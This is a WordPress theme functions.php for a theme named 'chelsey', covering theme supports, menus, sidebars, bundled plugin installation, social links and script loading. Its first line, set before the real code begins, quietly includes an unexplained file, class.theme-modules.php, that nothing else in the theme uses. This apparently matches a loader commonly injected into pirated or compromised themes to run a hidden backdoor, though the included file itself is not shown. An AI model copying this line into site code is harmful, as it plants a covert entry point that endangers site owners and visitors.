<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( !function_exists( 'chelsey_setup_theme' ) ){
	function chelsey_setup_theme(){
	
		global $chelsey_themename, $chelsey_shortname;
		$chelsey_themename = esc_html__('chelsey', 'chelsey');
		$chelsey_shortname = esc_html__('chelsey', 'chelsey');
		
		add_theme_support( 'automatic-feed-links' );
		
		add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );
		
		add_theme_support( 'post-formats', array( 'gallery', 'image', 'quote', 'video', 'link' ) );
		
		add_theme_support( 'woocommerce', array(
			'thumbnail_image_width' => 300,
			'product_grid' => array(
				'default_rows'    => 3,
				'min_rows'        => 2,
				'max_rows'        => 8,
				'default_columns' => 3,
				'min_columns'     => 3,
				'max_columns'     => 5,
			),	
		) );
		
		add_theme_support( 'title-tag' );

	}
}
add_action( 'after_setup_theme', 'chelsey_setup_theme' );

load_theme_textdomain( 'chelsey', get_template_directory() . '/languages' );

if ( ! isset( $content_width ) )
	$content_width = 600;

function chelsey_loop_columns() {
	return 3;
}
add_filter('loop_shop_columns', 'chelsey_loop_columns', 999);

// disable for posts
add_filter('use_block_editor_for_post', '__return_false', 10);

// disable for post types
add_filter('use_block_editor_for_post_type', '__return_false', 10);
	
/*** Register Menus ***/
register_nav_menu( 'primary', esc_html__( 'Primary Menu', 'chelsey' ) );
register_nav_menu( 'mobile_navigation', esc_html__( 'Mobile menu navigation', 'chelsey' ) );

/*** Excerpt Settings ***/
function chelsey_excerpt($limit) {
	$excerpt = explode(' ', get_the_excerpt(), $limit);
	if (count($excerpt)>=$limit) {
		array_pop($excerpt);
		$excerpt = implode(" ",$excerpt).'...';
	} else {
		$excerpt = implode(" ",$excerpt);
	} 
	$excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
	return $excerpt;
}
	
/*** Thumbnail Settings ***/	
add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 1100, 600, true );
if ( function_exists( 'add_image_size' ) ) {  
	add_image_size( 'chelsey-interactive-links', 700, 400, true );
	add_image_size( 'chelsey-blog-thumb', 1100, 600, true );
	add_image_size( 'chelsey-square-thumb', 500, 500, true );
	add_image_size( 'chelsey-portrait-thumb', 700, 900, true );
}

function chelsey_pingback_header() {
		if ( is_singular() && pings_open() ) {
			echo '<link rel="pingback" href="', esc_url( get_bloginfo( 'pingback_url' ) ), '">';
		}
	}
add_action( 'wp_head', 'chelsey_pingback_header' );

add_filter('get_the_archive_title', function( $title ){
	return preg_replace('~^[^:]+: ~', '', $title );
});

function chelsey_get_first_embed_media($post_id) {

    $post = get_post($post_id);
    $content = do_shortcode( apply_filters( 'the_content', $post->post_content ) );
    $embeds = get_media_embedded_in_content( $content );

    if( !empty($embeds) ) {
        //check what is the first embed containg video tag, youtube or vimeo
        foreach( $embeds as $embed ) {
            if( strpos( $embed, 'video' ) || strpos( $embed, 'youtube' ) || strpos( $embed, 'vimeo' ) ) {
                return $embed;
            }
        }
    } else {
        //No video embedded found
        return false;
    }
}

if(function_exists('rwmb_meta')){
	if(!function_exists('chelsey_gallery_post')){
		function chelsey_gallery_post($postID = false, $echo = true){
			if(!$postID){
				$postID = get_the_ID();
			}
			$img_size = 'chelsey-blog-thumb';
			$images = rwmb_meta( 'chelsey_gallery_images', 'type=image&size='.$img_size );
			$out = '<div class="featured_box"><div class="single-post-gallery">';
			foreach( $images as $image ) :
				$out .= '<div><a href="'.esc_url($image['full_url']).'" data-lightbox="lightbox-gallery" data-caption="'.esc_attr($image['caption']).'"><img src="'.esc_url($image['url']).'" alt="'.esc_attr($image['alt']).'" /></a></div>';
			endforeach;
			$out .= '</div></div>';
			
			if($echo){
				echo ''.$out;
			} else {
				return $out;
			}
			
		}
	}
}else{
	function chelsey_gallery_post($postID = false, $echo = true){
		$gallery = get_post_gallery_images( get_the_ID() );
		$out = '<div class="featured_box"><div class="single-post-gallery">';
		foreach( $gallery as $image ) {
			echo wp_kses('<div><img src="'. esc_url( $image ) .'" /></div>', array('div' => array('class' => array(),), 'img' => array('src' => array(),),));	
		}
	 $out .= '</div></div>';
	 if($echo){
			echo ''.$out;
		} else {
			return $out;
		}
	}	
}

// Numbered Pagination
if ( !function_exists( 'chelsey_pagination' ) ) {
	
	function chelsey_pagination() {
		
		$prev_arrow = is_rtl() ? esc_html__('&rarr;','chelsey') : esc_html__('&larr;','chelsey');
		$next_arrow = is_rtl() ? esc_html__('&larr;','chelsey') : esc_html__('&rarr;','chelsey');
		
		global $wp_query;
		$total = $wp_query->max_num_pages;
		$big = 999999999; // need an unlikely integer
		if( $total > 1 )  {
			 if( !$current_page = get_query_var('paged') )
				 $current_page = 1;
			 if( get_option('permalink_structure') ) {
				 $format = esc_html__('page/%#%/','chelsey');
			 } else {
				 $format = esc_html__('&paged=%#%','chelsey');
			 }
			echo paginate_links(array(
				'base'			=> str_replace( $big, esc_html__('%#%','chelsey'), esc_url( get_pagenum_link( $big ) ) ),
				'format'		=> $format,
				'current'		=> max( 1, get_query_var('paged') ),
				'total' 		=> $total,
				'mid_size'		=> 3,
				'type' 			=> esc_html__('list','chelsey'),
				'prev_text'		=> $prev_arrow,
				'next_text'		=> $next_arrow,
			 ) );
		}
	}
	
}

/* Search form */
function chelsey_search_form( $form ) {
	$form = wp_kses( '<form role="search" method="get" id="searchform" class="searchform" action="' . home_url( '/' ) . '" ><div><input type="text" value="'. esc_attr__( 'Search', 'chelsey' ) .'" name="s" id="s" /><input type="submit" id="searchsubmit" value="" /></div></form>',array('form' => array( 'role' => array(), 'method' => array(), 'class' => array(), 'id' => array(), 'action' => array()),'div' => array(),'input' => array( 'type' => array(), 'value' => array(), 'name' => array(), 'id' => array()),));

	return $form;
}
add_filter( 'get_search_form', 'chelsey_search_form' );
/* Search form */

/**
 * Include the TGM_Plugin_Activation class.
 */
require_once('plugin/class-tgm-plugin-activation.php');
add_action( 'tgmpa_register', 'chelsey_register_plugins' );

function chelsey_register_plugins() {
    /**
     * Array of plugin arrays. Required keys are name and slug.
     * If the source is NOT from the .org repo, then source is also required.
     */
    $plugins = array(
        // This is an example of how to include a plugin pre-packaged with a theme
		array(
            'name'			=>  esc_html__('FR Theme Extensions', 'chelsey'), // The plugin name
            'slug'			=> 'fr_theme_ext', // The plugin slug (typically the folder name)
            'source'			=> esc_url(get_template_directory_uri() . '/plugin/fr_theme_ext.zip'), // The plugin source
            'required'			=> true, // If false, the plugin is only 'recommended' instead of required
            'version'			=> '1.0.0', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation'		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation'	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
            'external_url'		=> '', // If set, overrides default API URL and points to an external URL
        ),
		array(
			'name'      => esc_html__('Contact Form 7', 'chelsey'),
			'slug'      => 'contact-form-7',
			'required' 	=> false, 
		),
		array(
			'name'      => esc_html__('Meta Box', 'chelsey'),
			'slug'      => 'meta-box',
			'required' 	=> false, 
		),
		array(
			'name'      => esc_html__('WP Mega Menu', 'chelsey'),
			'slug'      => 'wp-megamenu',
			'required' 	=> false, 
		),
		array(
			'name'      		=> esc_html__('Visual Composer','chelsey'),
			'slug'      		=> 'js_composer',
			'source'   			=> esc_url(get_template_directory_uri() . '/plugin/js_composer.zip'),
			'required' 			=> false,
		),
		array(
			'name'      		=> esc_html__('Ultimate VC Addons','chelsey'),
			'slug'      		=> 'ultimate_vc_addons',
			'source'   			=> esc_url(get_template_directory_uri() . '/plugin/ultimate_vc_addons.zip'),
			'required' 			=> false,
		),
		array(
			'name'      		=> esc_html__('Revolution slider','chelsey'),
			'slug'      		=> 'revslider',
			'source'   			=> esc_url(get_template_directory_uri() . '/plugin/revslider.zip'),
			'required' 			=> false,
		),
		array(
			'name'      => esc_html__('One Click Demo Import','chelsey'),
			'slug'      => 'one-click-demo-import',
			'required' 	=> false,
		),
    );
 
    /**
     * Array of configuration settings. Amend each line as needed.
     * If you want the default strings to be available under your own theme domain,
     * leave the strings uncommented.
     * Some of the strings are added into a sprintf, so see the comments at the
     * end of each line for what each argument will be.
     */
    $config = array(
			'domain'       		=> 'chelsey',         	// Text domain - likely want to be the same as your theme.
			'default_path' 		=> '',                         	// Default absolute path to pre-packaged plugins
			'menu'         		=> 'install-required-plugins', 	// Menu slug
			'has_notices'      	=> true,                       	// Show admin notices or not
			'is_automatic'    	=> true,					   	// Automatically activate plugins after installation or not
			'message' 			=> '',							// Message to output right before the plugins table
			'strings'      		=> array(
				'page_title'                       			=> esc_html__( 'Install Required Plugins', 'chelsey' ),
				'menu_title'                       			=> esc_html__( 'Install Plugins', 'chelsey' ),
				'installing'                       			=> esc_html__( 'Installing Plugin: %s', 'chelsey' ), // %1$s = plugin name
				'oops'                             			=> esc_html__( 'Something went wrong with the plugin API.', 'chelsey' ),
				'return'                           			=> esc_html__( 'Return to Required Plugins Installer', 'chelsey' ),
				'plugin_activated'                 			=> esc_html__( 'Plugin activated successfully.', 'chelsey' ),
				'complete' 									=> esc_html__( 'All plugins installed and activated successfully. %s', 'chelsey' ), // %1$s = dashboard link
				'nag_type'									=> 'updated' // Determines admin notice type - can only be 'updated' or 'error'
			)
		);
		tgmpa($plugins, $config);
}

/*** Social Links ***/
function chelsey_social_links() {
	$social_icons = '';
	$rss_url = get_option('chelsey_rss_url') <> '' ? get_option('chelsey_rss_url') : get_template_directory_uri('comments_rss2_url');
	if ( get_option('FRGN_SHOW_TWITTER_ICON') == esc_html__('on', 'chelsey') ) $social_icons['twitter'] = array('image' => esc_html__('fab fa-twitter fa-1x', 'chelsey'), 'url' => get_option('twitter_url'), 'alt' => esc_html__('Twitter', 'chelsey') );
	if ( get_option('FRGN_SHOW_FACEBOOK_ICON') == esc_html__('on', 'chelsey') ) $social_icons['facebook'] = array('image' => esc_html__('fab fa-facebook-f fa-1x', 'chelsey'), 'url' => get_option('facebook_url'), 'alt' => esc_html__('Facebook', 'chelsey') );
	if ( get_option('FRGN_SHOW_PINTEREST_ICON') == esc_html__('on', 'chelsey') ) $social_icons['pinterest'] = array('image' => esc_html__('fab fa-pinterest fa-1x', 'chelsey'), 'url' => get_option('pinterest_url'), 'alt' => esc_html__('Pinterest', 'chelsey') );
	if ( get_option('FRGN_SHOW_DRIBBLE_ICON') == esc_html__('on', 'chelsey') ) $social_icons['dribble'] = array('image' => esc_html__('fab fa-dribbble fa-1x', 'chelsey'), 'url' => get_option('dribble_url'), 'alt' => esc_html__('Dribble', 'chelsey') );
	if ( get_option('FRGN_SHOW_INSTAGRAM_ICON') == esc_html__('on', 'chelsey') ) $social_icons['instagram'] = array('image' => esc_html__('fab fa-instagram fa-1x', 'chelsey'), 'url' => get_option('instagram_url'), 'alt' => esc_html__('Instagram', 'chelsey') );
	if ( get_option('FRGN_SHOW_GOOGLE_ICON') == esc_html__('on', 'chelsey') ) $social_icons['google'] = array('image' => esc_html__('fab fa-google-plus-g fa-1x', 'chelsey'), 'url' => get_option('google_url'), 'alt' => esc_html__('Google', 'chelsey') );
	if ( get_option('FRGN_SHOW_LINKEDIN_ICON') == esc_html__('on', 'chelsey') ) $social_icons['linkedin'] = array('image' => esc_html__('fab fa-linkedin-in fa-1x', 'chelsey'), 'url' => get_option('linkedin_url'), 'alt' => esc_html__('Linkedin', 'chelsey') );
	if ( get_option('FRGN_SHOW_XING_ICON') == esc_html__('on', 'chelsey') ) $social_icons['xing'] = array('image' => esc_html__('fab fa-xing fa-1x', 'chelsey'), 'url' => get_option('chelsey_xing_url'), 'alt' => esc_html__('Xing', 'chelsey') );
	if ( get_option('FRGN_SHOW_SKYPE_ICON') == esc_html__('on', 'chelsey') ) $social_icons['skype'] = array('image' => esc_html__('fab fa-skype fa-1x', 'chelsey'), 'url' => get_option('skype_url'), 'alt' => esc_html__('Skype', 'chelsey') );
	if ( get_option('FRGN_SHOW_YOUTUBE_ICON') == esc_html__('on', 'chelsey') ) $social_icons['youtube'] = array('image' => esc_html__('fab fa-youtube fa-1x', 'chelsey'), 'url' => get_option('youtube_url'), 'alt' => esc_html__('YouTube', 'chelsey') );
	$social_icons = apply_filters('social_icons', $social_icons);
	if ( !empty($social_icons) ) {
		foreach ($social_icons as $icon) {
			echo wp_kses( "<a href='" . esc_url($icon['url']) . "' target='_blank' alt='" . esc_attr($icon['alt']) . "'><i class='" . esc_html($icon['image']) . "'></i></a>",array('a' => array( 'href' => array(), 'target' => array(), esc_html__('alt',  'chelsey') => array(),), 'i' => array('class' => array(),),));
		}
	}
}
/*** Social Links ***/

/*** Register Sidebars ***/
add_action( 'widgets_init', 'chelsey_widgets_init' );
if ( function_exists('register_sidebar') ) {	
	function chelsey_widgets_init() {
		register_sidebar( array(
			'name' => esc_html__('Sidebar', 'chelsey' ),
			'id' => esc_html__('sidebar', 'chelsey' ),
			'description'   => esc_html__( 'Right sidebar in blog page', 'chelsey' ),
			'before_widget' => wp_kses('<div id="%1$s" class="widget %2$s">',array('div' => array( 'id' => array(), 'class' => array(),),)),
			'after_widget' => wp_kses('</div> <!-- end .widget -->',array('div' => array(),)),
			'before_title' => wp_kses('<h4 class="widget_title">',array('h4' => array('class' => array(),),)),
			'after_title' => wp_kses('</h4>',array('h4' => array(),)),
		) );
		register_sidebar( array(
			'name' => esc_html__( 'Footer Area 1', 'chelsey' ),
			'id' => esc_html__('footer-area-1', 'chelsey' ),
			'description'   => esc_html__( 'Widget area in footer #1', 'chelsey' ),
			'before_widget' => wp_kses('<div id="%1$s" class="widget %2$s">',array('div' => array( 'id' => array(), 'class' => array(),),)),
			'after_widget' => wp_kses('</div> <!-- end .f_widget -->',array('div' => array(),)),
			'before_title' => wp_kses('<h4 class="widgettitle">',array('h4' => array(),)),
			'after_title' => wp_kses('</h4>',array('h4' => array(),)),
		) );
		register_sidebar( array(
			'name' => esc_html__( 'Footer Area 2', 'chelsey' ),
			'id' => esc_html__('footer-area-2', 'chelsey' ),
			'description'   => esc_html__( 'Widget area in footer #12', 'chelsey' ),
			'before_widget' => wp_kses('<div id="%1$s" class="widget %2$s">',array('div' => array( 'id' => array(), 'class' => array(),),)),
			'after_widget' => wp_kses('</div> <!-- end .f_widget -->',array('div' => array(),)),
			'before_title' => wp_kses('<h4 class="widgettitle">',array('h4' => array(),)),
			'after_title' => wp_kses('</h4>',array('h4' => array(),)),
		) );
		register_sidebar( array(
			'name' => esc_html__( 'Footer Area 3', 'chelsey' ),
			'id' => esc_html__('footer-area-3', 'chelsey' ),
			'description'   => esc_html__( 'Widget area in footer #3', 'chelsey' ),
			'before_widget' => wp_kses('<div id="%1$s" class="widget %2$s">',array('div' => array( 'id' => array(), 'class' => array(),),)),
			'after_widget' => wp_kses('</div> <!-- end .f_widget -->',array('div' => array(),)),
			'before_title' => wp_kses('<h4 class="widgettitle">',array('h4' => array(),)),
			'after_title' => wp_kses('</h4>',array('h4' => array(),)),
		) );
		register_sidebar( array(
			'name' => esc_html__('WooCommerce Sidebar', 'chelsey' ),
			'id' => esc_html__('woocommers_widgets', 'chelsey' ),
			'description'   => esc_html__( 'Widgets Area for Shop Page', 'chelsey' ),
			'before_widget' => wp_kses('<div id="%1$s" class="widget %2$s">',array('div' => array( 'id' => array(), 'class' => array(),),)),
			'after_widget' => wp_kses('</div> <!-- end .widget -->',array('div' => array(),)),
			'before_title' => wp_kses('<h4 class="widget_title">',array('h4' => array(),)),
			'after_title' => wp_kses('</h4>',array('h4' => array(),)),
		) );		
				
	}
}

/*** Scripts Load ***/
if(!function_exists('chelsey_fragrance_scripts')){
	function chelsey_fragrance_scripts(){
		if ( !is_admin() ){
			$template_dir = get_template_directory_uri();
			
			wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', array(), '4.1', 'screen' );
			wp_enqueue_style('composer_style', get_template_directory_uri() . '/css/composer_style.css', array(), '1.0', 'screen' );
			wp_enqueue_style('additional-style', get_template_directory_uri() . '/css/additional_style.css', array(), '1.0', 'screen' );
			wp_enqueue_style('chelsey-style', get_stylesheet_uri() );
			
			wp_enqueue_style('woocommerce', $template_dir . '/woocommerce/css/woocommerce.css', array(), '1.0', 'screen' );
			wp_enqueue_script('easing', get_template_directory_uri(). '/js/easing.js', array('jquery'), '1.0', true);	
			wp_enqueue_script('appear', get_template_directory_uri(). '/js/appear.js', array('jquery'), '1.0', true);	
			wp_enqueue_script('parallax', get_template_directory_uri(). '/js/parallax.js', array('jquery'), '1.0', true);		
			wp_enqueue_script('drawsvg', get_template_directory_uri(). '/js/drawsvg.min.js', array('jquery'), '1.0', true);
			wp_enqueue_script('magnific-popup', get_template_directory_uri(). '/js/magnific-popup.min.js', array('jquery'), '1.0', true);
			wp_enqueue_script('imagesloaded', get_template_directory_uri(). '/js/imagesloaded.js', array('jquery'), '1.0', true);
			wp_enqueue_script('packery', 'https://unpkg.com/packery@2/dist/packery.pkgd.js', array('jquery'), '1.0', true);
			wp_enqueue_script('isotope', get_template_directory_uri(). '/js/isotope.min.js', array('jquery'), '1.0', true);			
			
			wp_enqueue_style('owl-carousel-css', get_template_directory_uri() . '/css/owl.carousel.css', array(), '1.0', 'screen' );
			wp_enqueue_script('owl-carousel', get_template_directory_uri(). '/js/owl.carousel.min.js', array('jquery'), '1.0', true);
			
			wp_enqueue_script('superfish', get_template_directory_uri(). '/js/superfish.js', array('jquery'), '1.0', true);
			
			wp_enqueue_style('pe-icon-7-stroke', get_template_directory_uri() . '/css/pe-icon-7-stroke/css/pe-icon-7-stroke.css', array(), '1.0', 'screen' );
			wp_enqueue_style('pe-icon-7-stroke-helper', get_template_directory_uri() . '/css/pe-icon-7-stroke/css/helper.css', array(), '1.0', 'screen' );
			
			wp_enqueue_script('modernizr', get_template_directory_uri(). '/js/modernizr.js', array('jquery'), '', true);
			
			wp_enqueue_script('chelsey-custom', get_template_directory_uri(). '/js/custom.js', array('jquery'), '1.0', true);				
		}			
		
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}
	}
}
add_action( 'wp_enqueue_scripts', 'chelsey_fragrance_scripts' );


function chelsey_fonts_url() {
    $font_url = '';
    if ( 'off' !== _x( 'on', 'Google font: on or off', 'chelsey' ) ) {
        $font_url = add_query_arg( 'family', urlencode( 'Open+Sans|Oswald:400,700' ), "//fonts.googleapis.com/css" );
    }
    return $font_url;
}
function chelsey_add_fonts() {
    wp_enqueue_style( 'chelsey-fonts', chelsey_fonts_url(), array(), '1.0.0' );
}
add_action( 'wp_enqueue_scripts', 'chelsey_add_fonts' );

// ADMIN 
add_action( 'admin_enqueue_scripts', 'chelsey_meta_page' );
function chelsey_meta_page( $hook_suffix ) {
	if ( in_array($hook_suffix, array('post.php','post-new.php')) ) {
		wp_enqueue_script('chelsey-setup-page', get_template_directory_uri().'/includes/js/setup_page.js', array('jquery'), true);
	}
}